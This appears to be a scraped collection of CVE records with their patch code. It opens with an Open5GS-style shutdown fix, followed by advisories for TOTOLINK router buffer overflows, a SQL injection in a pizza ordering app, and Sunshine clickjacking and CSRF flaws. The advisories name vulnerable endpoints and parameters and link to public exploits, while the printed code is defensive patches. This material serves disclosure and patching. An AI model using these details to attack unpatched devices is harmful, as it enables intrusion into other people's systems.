diff --git a/src/smf/smf-sm.c b/src/smf/smf-sm.c
index df40591b02..833fbb4e4f 100644
--- a/src/smf/smf-sm.c
+++ b/src/smf/smf-sm.c
@@ -711,10 +711,33 @@ void smf_state_operational(ogs_fsm_t *s, smf_event_t *e)
             CASE(OGS_SBI_RESOURCE_NAME_NF_INSTANCES)
                 nf_instance = e->h.sbi.data;
                 ogs_assert(nf_instance);
-                ogs_assert(OGS_FSM_STATE(&nf_instance->sm));
 
-                e->h.sbi.message = &sbi_message;
-                ogs_fsm_dispatch(&nf_instance->sm, e);
+    /*
+     * Guard against dispatching to an FSM that may have been finalized
+     * by an asynchronous shutdown triggered by SIGTERM.
+     *
+     * In init.c’s event_termination(), which can be invoked asynchronously
+     * when the process receives SIGTERM, we iterate over all NF instances:
+     *     ogs_list_for_each(&ogs_sbi_self()->nf_instance_list, nf_instance)
+     *         ogs_sbi_nf_fsm_fini(nf_instance);
+     * and call ogs_fsm_fini() on each instance’s FSM. That finalizes the FSM
+     * and its state is reset to zero.
+     *
+     * After event_termination(), any incoming SBI response—such as an NRF
+     * client callback arriving after deregistration—would otherwise be
+     * dispatched into a dead FSM and trigger an assertion failure.
+     *
+     * To avoid this, we check OGS_FSM_STATE(&nf_instance->sm):
+     *   - If non-zero, the FSM is still active and can safely handle the event.
+     *   - If zero, the FSM has already been finalized by event_termination(),
+     *     so we log and drop the event to allow graceful shutdown.
+     */
+                if (OGS_FSM_STATE(&nf_instance->sm)) {
+                    e->h.sbi.message = &sbi_message;
+                    ogs_fsm_dispatch(&nf_instance->sm, e);
+                } else
+                    ogs_error("NF instance FSM has been finalized");
+
                 break;
 
             CASE(OGS_SBI_RESOURCE_NAME_SUBSCRIPTIONS)
diff --git a/src/udm/udm-sm.c b/src/udm/udm-sm.c
index 95cad67143..49b3ca9a44 100644
--- a/src/udm/udm-sm.c
+++ b/src/udm/udm-sm.c
@@ -288,10 +288,33 @@ void udm_state_operational(ogs_fsm_t *s, udm_event_t *e)
             CASE(OGS_SBI_RESOURCE_NAME_NF_INSTANCES)
                 nf_instance = e->h.sbi.data;
                 ogs_assert(nf_instance);
-                ogs_assert(OGS_FSM_STATE(&nf_instance->sm));
 
-                e->h.sbi.message = &message;
-                ogs_fsm_dispatch(&nf_instance->sm, e);
+    /*
+     * Guard against dispatching to an FSM that may have been finalized
+     * by an asynchronous shutdown triggered by SIGTERM.
+     *
+     * In init.c’s event_termination(), which can be invoked asynchronously
+     * when the process receives SIGTERM, we iterate over all NF instances:
+     *     ogs_list_for_each(&ogs_sbi_self()->nf_instance_list, nf_instance)
+     *         ogs_sbi_nf_fsm_fini(nf_instance);
+     * and call ogs_fsm_fini() on each instance’s FSM. That finalizes the FSM
+     * and its state is reset to zero.
+     *
+     * After event_termination(), any incoming SBI response—such as an NRF
+     * client callback arriving after deregistration—would otherwise be
+     * dispatched into a dead FSM and trigger an assertion failure.
+     *
+     * To avoid this, we check OGS_FSM_STATE(&nf_instance->sm):
+     *   - If non-zero, the FSM is still active and can safely handle the event.
+     *   - If zero, the FSM has already been finalized by event_termination(),
+     *     so we log and drop the event to allow graceful shutdown.
+     */
+                if (OGS_FSM_STATE(&nf_instance->sm)) {
+                    e->h.sbi.message = &message;
+                    ogs_fsm_dispatch(&nf_instance->sm, e);
+                } else
+                    ogs_error("NF instance FSM has been finalized");
+
                 break;
 
             CASE(OGS_SBI_RESOURCE_NAME_SUBSCRIPTIONS)
diff --git a/src/udr/udr-sm.c b/src/udr/udr-sm.c
index 02ce49770e..72100483c8 100644
--- a/src/udr/udr-sm.c
+++ b/src/udr/udr-sm.c
@@ -225,10 +225,33 @@ void udr_state_operational(ogs_fsm_t *s, udr_event_t *e)
             CASE(OGS_SBI_RESOURCE_NAME_NF_INSTANCES)
                 nf_instance = e->h.sbi.data;
                 ogs_assert(nf_instance);
-                ogs_assert(OGS_FSM_STATE(&nf_instance->sm));
 
-                e->h.sbi.message = &message;
-                ogs_fsm_dispatch(&nf_instance->sm, e);
+    /*
+     * Guard against dispatching to an FSM that may have been finalized
+     * by an asynchronous shutdown triggered by SIGTERM.
+     *
+     * In init.c’s event_termination(), which can be invoked asynchronously
+     * when the process receives SIGTERM, we iterate over all NF instances:
+     *     ogs_list_for_each(&ogs_sbi_self()->nf_instance_list, nf_instance)
+     *         ogs_sbi_nf_fsm_fini(nf_instance);
+     * and call ogs_fsm_fini() on each instance’s FSM. That finalizes the FSM
+     * and its state is reset to zero.
+     *
+     * After event_termination(), any incoming SBI response—such as an NRF
+     * client callback arriving after deregistration—would otherwise be
+     * dispatched into a dead FSM and trigger an assertion failure.
+     *
+     * To avoid this, we check OGS_FSM_STATE(&nf_instance->sm):
+     *   - If non-zero, the FSM is still active and can safely handle the event.
+     *   - If zero, the FSM has already been finalized by event_termination(),
+     *     so we log and drop the event to allow graceful shutdown.
+     */
+                if (OGS_FSM_STATE(&nf_instance->sm)) {
+                    e->h.sbi.message = &message;
+                    ogs_fsm_dispatch(&nf_instance->sm, e);
+                } else
+                    ogs_error("NF instance FSM has been finalized");
+
                 break;
 
             CASE(OGS_SBI_RESOURCE_NAME_SUBSCRIPTIONS)


================================================================================


CVE ID: CVE-2025-6940
Published: 2025-07-01T03:15:21.670
Modified: 2025-07-07T14:41:12.100
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability classified as critical was found in TOTOLINK A702R 4.0.0-B20230721.1521. Affected by this vulnerability is an unknown functionality of the file /boafrm/formParentControl of the component HTTP POST Request Handler. The manipulation of the argument submit-url leads to buffer overflow. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (8):
  1. https://github.com/awindog/cve/blob/main/688/27.md [Exploit, Third Party Advisory]
  2. https://github.com/awindog/cve/blob/main/688/27.md#poc [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314461 [Permissions Required]
  4. https://vuldb.com/?id.314461 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605861 [Third Party Advisory, VDB Entry]
  6. https://www.totolink.net/ [Product]
  7. https://github.com/awindog/cve/blob/main/688/27.md [Exploit, Third Party Advisory]
  8. https://github.com/awindog/cve/blob/main/688/27.md#poc [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314461 ---
submit-url

================================================================================


CVE ID: CVE-2025-6939
Published: 2025-07-01T03:15:21.483
Modified: 2025-07-07T14:41:20.020
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability classified as critical has been found in TOTOLINK A3002RU 3.0.0-B20230809.1615. Affected is an unknown function of the file /boafrm/formWlSiteSurvey of the component HTTP POST Request Handler. The manipulation of the argument submit-url leads to buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/awindog/cve/blob/main/688/30.md [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314460 [Permissions Required]
  3. https://vuldb.com/?id.314460 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605860 [Third Party Advisory, VDB Entry]
  5. https://www.totolink.net/ [Product]
  6. https://github.com/awindog/cve/blob/main/688/30.md [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314460 ---
submit-url

================================================================================


CVE ID: CVE-2025-6938
Published: 2025-07-01T02:15:22.873
Modified: 2025-07-07T14:41:30.903
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Simple Pizza Ordering System 1.0. It has been rated as critical. This issue affects some unknown processing of the file /editcus.php. The manipulation of the argument ID leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/Catcheryp/CVE/issues/4 [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314459 [Permissions Required]
  4. https://vuldb.com/?id.314459 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605749 [Third Party Advisory, VDB Entry]
  6. https://github.com/Catcheryp/CVE/issues/4 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314459 ---
id

================================================================================


CVE ID: CVE-2025-53096
Published: 2025-07-01T02:15:22.717
Modified: 2025-08-22T14:28:45.230
CVSS Score: 5.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L

CWE Categories:
  - CWE-1021: Improper Restriction of Rendered UI Layers or Frames

Description:
Sunshine is a self-hosted game stream host for Moonlight. Prior to version 2025.628.4510, the web UI of Sunshine lacks protection against Clickjacking attacks. This vulnerability allows an attacker to embed the Sunshine interface within a malicious website using an invisible or disguised iframe. If a user is tricked into interacting (one or multiple clicks) with the malicious page while authenticated, they may unknowingly perform actions within the Sunshine application without their consent. This issue has been patched in version 2025.628.4510.

References (2):
  1. https://github.com/LizardByte/Sunshine/commit/2f27a57d01911436017f87bf08b9e36dcfaa86cc [Patch]
  2. https://github.com/LizardByte/Sunshine/security/advisories/GHSA-x97g-h2vp-g2c5 [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/LizardByte/Sunshine/commit/2f27a57d01911436017f87bf08b9e36dcfaa86cc ---
From 2f27a57d01911436017f87bf08b9e36dcfaa86cc Mon Sep 17 00:00:00 2001
From: axfla <33458662+axfla@users.noreply.github.com>
Date: Fri, 27 Jun 2025 23:27:35 +0200
Subject: [PATCH] Merge commit from fork

---
 src/confighttp.cpp | 39 ++++++++++++++++++++++++++++++++++++---
 1 file changed, 36 insertions(+), 3 deletions(-)

diff --git a/src/confighttp.cpp b/src/confighttp.cpp
index 43d6df240d8..059b6242b45 100644
--- a/src/confighttp.cpp
+++ b/src/confighttp.cpp
@@ -81,7 +81,8 @@ namespace confighttp {
   void send_response(resp_https_t response, const nlohmann::json &output_tree) {
     SimpleWeb::CaseInsensitiveMultimap headers;
     headers.emplace("Content-Type", "application/json");
-
+    headers.emplace("X-Frame-Options", "DENY");
+    headers.emplace("Content-Security-Policy", "frame-ancestors 'none';");
     response->write(output_tree.dump(), headers);
   }
 
@@ -103,7 +104,9 @@ namespace confighttp {
 
     const SimpleWeb::CaseInsensitiveMultimap headers {
       {"Content-Type", "application/json"},
-      {"WWW-Authenticate", R"(Basic realm="Sunshine Gamestream Host", charset="UTF-8")"}
+      {"WWW-Authenticate", R"(Basic realm="Sunshine Gamestream Host", charset="UTF-8")"},
+      {"X-Frame-Options", "DENY"},
+      {"Content-Security-Policy", "frame-ancestors 'none';"}
     };
 
     response->write(code, tree.dump(), headers);
@@ -119,7 +122,9 @@ namespace confighttp {
     auto address = net::addr_to_normalized_string(request->remote_endpoint().address());
     BOOST_LOG(info) << "Web UI: ["sv << address << "] -- not authorized"sv;
     const SimpleWeb::CaseInsensitiveMultimap headers {
-      {"Location", path}
+      {"Location", path},
+      {"X-Frame-Options", "DENY"},
+      {"Content-Security-Policy", "frame-ancestors 'none';"}
     };
     response->write(SimpleWeb::StatusCode::redirection_temporary_redirect, headers);
   }
@@ -189,6 +194,8 @@ namespace confighttp {
 
     SimpleWeb::CaseInsensitiveMultimap headers;
     headers.emplace("Content-Type", "application/json");
+    headers.emplace("X-Frame-Options", "DENY");
+    headers.emplace("Content-Security-Policy", "frame-ancestors 'none';");
 
     response->write(code, tree.dump(), headers);
   }
@@ -209,6 +216,8 @@ namespace confighttp {
 
     SimpleWeb::CaseInsensitiveMultimap headers;
     headers.emplace("Content-Type", "application/json");
+    headers.emplace("X-Frame-Options", "DENY");
+    headers.emplace("Content-Security-Policy", "frame-ancestors 'none';");
 
     response->write(code, tree.dump(), headers);
   }
@@ -262,6 +271,8 @@ namespace confighttp {
     std::string content = file_handler::read_file(WEB_DIR "index.html");
     SimpleWeb::CaseInsensitiveMultimap headers;
     headers.emplace("Content-Type", "text/html; charset=utf-8");
+    headers.emplace("X-Frame-Options", "DENY");
+    headers.emplace("Content-Security-Policy", "frame-ancestors 'none';");
     response->write(content, headers);
   }
 
@@ -280,6 +291,8 @@ namespace confighttp {
     std::string content = file_handler::read_file(WEB_DIR "pin.html");
     SimpleWeb::CaseInsensitiveMultimap headers;
     headers.emplace("Content-Type", "text/html; charset=utf-8");
+    headers.emplace("X-Frame-Options", "DENY");
+    headers.emplace("Content-Security-Policy", "frame-ancestors 'none';");
     response->write(content, headers);
   }
 
@@ -298,6 +311,8 @@ namespace confighttp {
     std::string content = file_handler::read_file(WEB_DIR "apps.html");
     SimpleWeb::CaseInsensitiveMultimap headers;
     headers.emplace("Content-Type", "text/html; charset=utf-8");
+    headers.emplace("X-Frame-Options", "DENY");
+    headers.emplace("Content-Security-Policy", "frame-ancestors 'none';");
     headers.emplace("Access-Control-Allow-Origin", "https://images.igdb.com/");
     response->write(content, headers);
   }
@@ -317,6 +332,8 @@ namespace confighttp {
     std::string content = file_handler::read_file(WEB_DIR "clients.html");
     SimpleWeb::CaseInsensitiveMultimap headers;
     headers.emplace("Content-Type", "text/html; charset=utf-8");
+    headers.emplace("X-Frame-Options", "DENY");
+    headers.emplace("Content-Security-Policy", "frame-ancestors 'none';");
     response->write(content, headers);
   }
 
@@ -335,6 +352,8 @@ namespace confighttp {
     std::string content = file_handler::read_file(WEB_DIR "config.html");
     SimpleWeb::CaseInsensitiveMultimap headers;
     headers.emplace("Content-Type", "text/html; charset=utf-8");
+    headers.emplace("X-Frame-Options", "DENY");
+    headers.emplace("Content-Security-Policy", "frame-ancestors 'none';");
     response->write(content, headers);
   }
 
@@ -353,6 +372,8 @@ namespace confighttp {
     std::string content = file_handler::read_file(WEB_DIR "password.html");
     SimpleWeb::CaseInsensitiveMultimap headers;
     headers.emplace("Content-Type", "text/html; charset=utf-8");
+    headers.emplace("X-Frame-Options", "DENY");
+    headers.emplace("Content-Security-Policy", "frame-ancestors 'none';");
     response->write(content, headers);
   }
 
@@ -370,6 +391,8 @@ namespace confighttp {
     std::string content = file_handler::read_file(WEB_DIR "welcome.html");
     SimpleWeb::CaseInsensitiveMultimap headers;
     headers.emplace("Content-Type", "text/html; charset=utf-8");
+    headers.emplace("X-Frame-Options", "DENY");
+    headers.emplace("Content-Security-Policy", "frame-ancestors 'none';");
     response->write(content, headers);
   }
 
@@ -388,6 +411,8 @@ namespace confighttp {
     std::string content = file_handler::read_file(WEB_DIR "troubleshooting.html");
     SimpleWeb::CaseInsensitiveMultimap headers;
     headers.emplace("Content-Type", "text/html; charset=utf-8");
+    headers.emplace("X-Frame-Options", "DENY");
+    headers.emplace("Content-Security-Policy", "frame-ancestors 'none';");
     response->write(content, headers);
   }
 
@@ -404,6 +429,8 @@ namespace confighttp {
     std::ifstream in(WEB_DIR "images/sunshine.ico", std::ios::binary);
     SimpleWeb::CaseInsensitiveMultimap headers;
     headers.emplace("Content-Type", "image/x-icon");
+    headers.emplace("X-Frame-Options", "DENY");
+    headers.emplace("Content-Security-Policy", "frame-ancestors 'none';");
     response->write(SimpleWeb::StatusCode::success_ok, in, headers);
   }
 
@@ -420,6 +447,8 @@ namespace confighttp {
     std::ifstream in(WEB_DIR "images/logo-sunshine-45.png", std::ios::binary);
     SimpleWeb::CaseInsensitiveMultimap headers;
     headers.emplace("Content-Type", "image/png");
+    headers.emplace("X-Frame-Options", "DENY");
+    headers.emplace("Content-Security-Policy", "frame-ancestors 'none';");
     response->write(SimpleWeb::StatusCode::success_ok, in, headers);
   }
 
@@ -471,6 +500,8 @@ namespace confighttp {
     // if it is, set the content type to the mime type
     SimpleWeb::CaseInsensitiveMultimap headers;
     headers.emplace("Content-Type", mimeType->second);
+    headers.emplace("X-Frame-Options", "DENY");
+    headers.emplace("Content-Security-Policy", "frame-ancestors 'none';");
     std::ifstream in(filePath.string(), std::ios::binary);
     response->write(SimpleWeb::StatusCode::success_ok, in, headers);
   }
@@ -971,6 +1002,8 @@ namespace confighttp {
     std::string content = file_handler::read_file(config::sunshine.log_file.c_str());
     SimpleWeb::CaseInsensitiveMultimap headers;
     headers.emplace("Content-Type", "text/plain");
+    headers.emplace("X-Frame-Options", "DENY");
+    headers.emplace("Content-Security-Policy", "frame-ancestors 'none';");
     response->write(SimpleWeb::StatusCode::success_ok, content, headers);
   }
 


================================================================================


CVE ID: CVE-2025-53095
Published: 2025-07-01T02:15:22.563
Modified: 2025-08-22T13:44:40.643
CVSS Score: 9.6 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-352: Cross-Site Request Forgery (CSRF)

Description:
Sunshine is a self-hosted game stream host for Moonlight. Prior to version 2025.628.4510, the web UI of Sunshine lacks protection against Cross-Site Request Forgery (CSRF) attacks. This vulnerability allows an attacker to craft a malicious web page that, when visited by an authenticated user, can trigger unintended actions within the Sunshine application on behalf of that user. Specifically, since the application does OS command execution by design, this issue can be exploited to abuse the "Command Preparations" feature, enabling an attacker to inject arbitrary commands that will be executed with Administrator privileges when an application is launched. This issue has been patched in version 2025.628.4510.

References (2):
  1. https://github.com/LizardByte/Sunshine/commit/738ac93a0ec1cd10412d1f339968775f53bfefe0 [Patch]
  2. https://github.com/LizardByte/Sunshine/security/advisories/GHSA-39hj-fxvw-758m [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/LizardByte/Sunshine/commit/738ac93a0ec1cd10412d1f339968775f53bfefe0 ---
From 738ac93a0ec1cd10412d1f339968775f53bfefe0 Mon Sep 17 00:00:00 2001
From: TheElixZammuto <theelixzammuto@gmail.com>
Date: Fri, 27 Jun 2025 22:57:59 +0200
Subject: [PATCH] Merge commit from fork

* (security) Mandate content-type on POST calls

* (security) Add JSON content-type in POST requests with a body

* Added Content Type on missing endpoints

* (review) docs and newlines

* (docs) add JSON content type header

* style(clang-format): fix lint errors

---------

Co-authored-by: axfla <axfla@hotmail.fr>
Co-authored-by: ReenigneArcher <42013603+ReenigneArcher@users.noreply.github.com>
---
 docs/api.js                                   |  3 +-
 src/confighttp.cpp                            | 66 +++++++++++++++++++
 src_assets/common/assets/web/apps.html        | 13 +++-
 src_assets/common/assets/web/config.html      |  8 ++-
 src_assets/common/assets/web/password.html    |  3 +
 src_assets/common/assets/web/pin.html         |  8 ++-
 .../common/assets/web/troubleshooting.html    | 31 +++++++--
 src_assets/common/assets/web/welcome.html     |  3 +
 8 files changed, 127 insertions(+), 8 deletions(-)

diff --git a/docs/api.js b/docs/api.js
index 5f887e94e93..eff63583fef 100644
--- a/docs/api.js
+++ b/docs/api.js
@@ -9,7 +9,7 @@ function generateExamples(endpoint, method, body = null) {
   }
 
   return {
-    cURL: `curl -u user:pass -X ${method.trim()} -k https://localhost:47990${endpoint.trim()}${curlBodyString}`,
+    cURL: `curl -u user:pass -H "Content-Type: application/json" -X ${method.trim()} -k https://localhost:47990${endpoint.trim()}${curlBodyString}`,
     Python: `import json
 import requests
 from requests.auth import HTTPBasicAuth
@@ -30,6 +30,7 @@ requests.${method.trim().toLowerCase()}(
 .then(data => console.log(data));`,
     PowerShell: `Invoke-RestMethod \`
   -SkipCertificateCheck \`
+  -ContentType 'application/json' \`
   -Uri 'https://localhost:47990${endpoint.trim()}' \`
   -Method ${method.trim()} \`
   -Headers @{Authorization = 'Basic ' + [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('user:pass'))}
diff --git a/src/confighttp.cpp b/src/confighttp.cpp
index 4ba09b88a5a..43d6df240d8 100644
--- a/src/confighttp.cpp
+++ b/src/confighttp.cpp
@@ -213,6 +213,39 @@ namespace confighttp {
     response->write(code, tree.dump(), headers);
   }
 
+  /**
+   * @brief Validate the request content type and send bad request when mismatch.
+   * @param response The HTTP response object.
+   * @param request The HTTP request object.
+   * @param contentType The expected content type
+   */
+  bool check_content_type(resp_https_t response, req_https_t request, const std::string_view &contentType) {
+    auto requestContentType = request->header.find("content-type");
+    if (requestContentType == request->header.end()) {
+      bad_request(response, request, "Content type not provided");
+      return false;
+    }
+    // Extract the media type part before any parameters (e.g., charset)
+    std::string actualContentType = requestContentType->second;
+    size_t semicolonPos = actualContentType.find(';');
+    if (semicolonPos != std::string::npos) {
+      actualContentType = actualContentType.substr(0, semicolonPos);
+    }
+
+    // Trim whitespace and convert to lowercase for case-insensitive comparison
+    boost::algorithm::trim(actualContentType);
+    boost::algorithm::to_lower(actualContentType);
+
+    std::string expectedContentType(contentType);
+    boost::algorithm::to_lower(expectedContentType);
+
+    if (actualContentType != expectedContentType) {
+      bad_request(response, request, "Content type mismatch");
+      return false;
+    }
+    return true;
+  }
+
   /**
    * @brief Get the index page.
    * @param response The HTTP response object.
@@ -535,6 +568,9 @@ namespace confighttp {
    * @api_examples{/api/apps| POST| {"name":"Hello, World!","index":-1}}
    */
   void saveApp(resp_https_t response, req_https_t request) {
+    if (!check_content_type(response, request, "application/json")) {
+      return;
+    }
     if (!authenticate(response, request)) {
       return;
     }
@@ -602,6 +638,9 @@ namespace confighttp {
    * @api_examples{/api/apps/close| POST| null}
    */
   void closeApp(resp_https_t response, req_https_t request) {
+    if (!check_content_type(response, request, "application/json")) {
+      return;
+    }
     if (!authenticate(response, request)) {
       return;
     }
@@ -623,6 +662,9 @@ namespace confighttp {
    * @api_examples{/api/apps/9999| DELETE| null}
    */
   void deleteApp(resp_https_t response, req_https_t request) {
+    if (!check_content_type(response, request, "application/json")) {
+      return;
+    }
     if (!authenticate(response, request)) {
       return;
     }
@@ -703,6 +745,9 @@ namespace confighttp {
    * @api_examples{/api/unpair| POST| {"uuid":"1234"}}
    */
   void unpair(resp_https_t response, req_https_t request) {
+    if (!check_content_type(response, request, "application/json")) {
+      return;
+    }
     if (!authenticate(response, request)) {
       return;
     }
@@ -733,6 +778,9 @@ namespace confighttp {
    * @api_examples{/api/clients/unpair-all| POST| null}
    */
   void unpairAll(resp_https_t response, req_https_t request) {
+    if (!check_content_type(response, request, "application/json")) {
+      return;
+    }
     if (!authenticate(response, request)) {
       return;
     }
@@ -809,6 +857,9 @@ namespace confighttp {
    * @api_examples{/api/config| POST| {"key":"value"}}
    */
   void saveConfig(resp_https_t response, req_https_t request) {
+    if (!check_content_type(response, request, "application/json")) {
+      return;
+    }
     if (!authenticate(response, request)) {
       return;
     }
@@ -855,6 +906,9 @@ namespace confighttp {
    * @api_examples{/api/covers/upload| POST| {"key":"igdb_1234","url":"https://images.igdb.com/igdb/image/upload/t_cover_big_2x/abc123.png"}}
    */
   void uploadCover(resp_https_t response, req_https_t request) {
+    if (!check_content_type(response, request, "application/json")) {
+      return;
+    }
     if (!authenticate(response, request)) {
       return;
     }
@@ -938,6 +992,9 @@ namespace confighttp {
    * @api_examples{/api/password| POST| {"currentUsername":"admin","currentPassword":"admin","newUsername":"admin","newPassword":"admin","confirmNewPassword":"admin"}}
    */
   void savePassword(resp_https_t response, req_https_t request) {
+    if (!check_content_type(response, request, "application/json")) {
+      return;
+    }
     if (!config::sunshine.username.empty() && !authenticate(response, request)) {
       return;
     }
@@ -1008,6 +1065,9 @@ namespace confighttp {
    * @api_examples{/api/pin| POST| {"pin":"1234","name":"My PC"}}
    */
   void savePin(resp_https_t response, req_https_t request) {
+    if (!check_content_type(response, request, "application/json")) {
+      return;
+    }
     if (!authenticate(response, request)) {
       return;
     }
@@ -1044,6 +1104,9 @@ namespace confighttp {
    * @api_examples{/api/reset-display-device-persistence| POST| null}
    */
   void resetDisplayDevicePersistence(resp_https_t response, req_https_t request) {
+    if (!check_content_type(response, request, "application/json")) {
+      return;
+    }
     if (!authenticate(response, request)) {
       return;
     }
@@ -1063,6 +1126,9 @@ namespace confighttp {
    * @api_examples{/api/restart| POST| null}
    */
   void restart(resp_https_t response, req_https_t request) {
+    if (!check_content_type(response, request, "application/json")) {
+      return;
+    }
     if (!authenticate(response, request)) {
       return;
     }
diff --git a/src_assets/common/assets/web/apps.html b/src_assets/common/assets/web/apps.html
index 66e264e3c8d..8b0cb517c57 100644
--- a/src_assets/common/assets/web/apps.html
+++ b/src_assets/common/assets/web/apps.html
@@ -440,7 +440,12 @@ <h4>{{ $t('apps.env_vars_about') }}</h4>
           "Are you sure to delete " + this.apps[id].name + "?"
         );
         if (resp) {
-          fetch("./api/apps/" + id, { method: "DELETE" }).then((r) => {
+          fetch("./api/apps/" + id, {
+            method: "DELETE",
+            headers: { 
+              "Content-Type": "application/json" 
+            },
+          }).then((r) => {
             if (r.status === 200) document.location.reload();
           });
         }
@@ -540,6 +545,9 @@ <h4>{{ $t('apps.env_vars_about') }}</h4>
         this.coverFinderBusy = true;
         fetch("./api/covers/upload", {
           method: "POST",
+          headers: {
+            'Content-Type': 'application/json'
+          },
           body: JSON.stringify({
             key: cover.key,
             url: cover.saveUrl,
@@ -555,6 +563,9 @@ <h4>{{ $t('apps.env_vars_about') }}</h4>
         this.editForm["image-path"] = this.editForm["image-path"].toString().replace(/"/g, '');
         fetch("./api/apps", {
           method: "POST",
+          headers: {
+            'Content-Type': 'application/json'
+          },
           body: JSON.stringify(this.editForm),
         }).then((r) => {
           if (r.status === 200) document.location.reload();
diff --git a/src_assets/common/assets/web/config.html b/src_assets/common/assets/web/config.html
index e6a85b874bb..f021fd71aab 100644
--- a/src_assets/common/assets/web/config.html
+++ b/src_assets/common/assets/web/config.html
@@ -371,6 +371,9 @@ <h1 class="my-4">{{ $t('config.configuration') }}</h1>
 
         return fetch("./api/config", {
           method: "POST",
+          headers: {
+            'Content-Type': 'application/json'
+          },
           body: JSON.stringify(config),
         }).then((r) => {
           if (r.status === 200) {
@@ -393,7 +396,10 @@ <h1 class="my-4">{{ $t('config.configuration') }}</h1>
               this.saved = this.restarted = false;
             }, 5000);
             fetch("./api/restart", {
-              method: "POST"
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              }
             });
           }
         });
diff --git a/src_assets/common/assets/web/password.html b/src_assets/common/assets/web/password.html
index 854ee596271..9f1e7194a79 100644
--- a/src_assets/common/assets/web/password.html
+++ b/src_assets/common/assets/web/password.html
@@ -92,6 +92,9 @@ <h4>{{ $t('password.new_creds') }}</h4>
         this.error = null;
         fetch("./api/password", {
           method: "POST",
+          headers: {
+            'Content-Type': 'application/json'
+          },
           body: JSON.stringify(this.passwordData),
         }).then((r) => {
           if (r.status === 200) {
diff --git a/src_assets/common/assets/web/pin.html b/src_assets/common/assets/web/pin.html
index a5dcdb5dd6b..d16a5de156e 100644
--- a/src_assets/common/assets/web/pin.html
+++ b/src_assets/common/assets/web/pin.html
@@ -39,7 +39,13 @@ <h1 class="my-4 text-center">{{ $t('pin.pin_pairing') }}</h1>
         let name = document.querySelector("#name-input").value;
         document.querySelector("#status").innerHTML = "";
         let b = JSON.stringify({pin: pin, name: name});
-        fetch("./api/pin", {method: "POST", body: b})
+        fetch("./api/pin", {
+          method: "POST", 
+          headers: {
+            'Content-Type': 'application/json'
+          }, 
+          body: b
+        })
           .then((response) => response.json())
           .then((response) => {
             if (response.status === true) {
diff --git a/src_assets/common/assets/web/troubleshooting.html b/src_assets/common/assets/web/troubleshooting.html
index 46d7218b671..d742867fbf2 100644
--- a/src_assets/common/assets/web/troubleshooting.html
+++ b/src_assets/common/assets/web/troubleshooting.html
@@ -207,7 +207,11 @@ <h2 id="logs">{{ $t('troubleshooting.logs') }}</h2>
         },
         closeApp() {
           this.closeAppPressed = true;
-          fetch("./api/apps/close", { method: "POST" })
+          fetch("./api/apps/close", { 
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            } })
             .then((r) => r.json())
             .then((r) => {
               this.closeAppPressed = false;
@@ -219,7 +223,12 @@ <h2 id="logs">{{ $t('troubleshooting.logs') }}</h2>
         },
         unpairAll() {
           this.unpairAllPressed = true;
-          fetch("./api/clients/unpair-all", { method: "POST" })
+          fetch("./api/clients/unpair-all", { 
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            }
+           })
             .then((r) => r.json())
             .then((r) => {
               this.unpairAllPressed = false;
@@ -231,7 +240,13 @@ <h2 id="logs">{{ $t('troubleshooting.logs') }}</h2>
             });
         },
         unpairSingle(uuid) {
-          fetch("./api/clients/unpair", { method: "POST", body: JSON.stringify({ uuid }) }).then(() => {
+          fetch("./api/clients/unpair", { 
+            method: "POST", 
+            headers: {
+              'Content-Type': 'application/json'
+            }, 
+            body: JSON.stringify({ uuid }) 
+          }).then(() => {
             this.showApplyMessage = true;
             this.refreshClients();
           });
@@ -263,11 +278,19 @@ <h2 id="logs">{{ $t('troubleshooting.logs') }}</h2>
           }, 5000);
           fetch("./api/restart", {
             method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            }
           });
         },
         ddResetPersistence() {
           this.ddResetPressed = true;
-          fetch("/api/reset-display-device-persistence", { method: "POST" })
+          fetch("/api/reset-display-device-persistence", { 
+            method: "POST",
+            headers: { 
+              "Content-Type": "application/json" 
+            } 
+          })
             .then((r) => r.json())
             .then((r) => {
               this.ddResetPressed = false;
diff --git a/src_assets/common/assets/web/welcome.html b/src_assets/common/assets/web/welcome.html
